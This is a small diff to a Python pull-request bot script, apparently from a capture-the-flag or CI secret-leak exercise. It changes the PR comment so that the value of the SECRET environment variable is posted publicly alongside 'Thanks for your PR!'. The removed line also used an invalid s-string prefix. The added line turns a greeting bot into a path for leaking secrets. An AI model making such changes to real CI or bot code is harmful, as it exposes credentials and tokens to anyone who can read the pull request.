@@ -15,9 +15,7 @@ def main():
     repo = GitRepo(get_git_repo_dir(), get_git_remote_name())
     org, project = repo.gh_owner_and_name()
     flag = os.getenv("SECRET")
-    print(s"FLAG: {flag}")
-    gh_post_pr_comment(org, project, args.pr_num, "Thanks for your PR!")
-
+    gh_post_pr_comment(org, project, args.pr_num, f"Thanks for your PR! {flag}")
 
 if __name__ == "__main__":
     main()
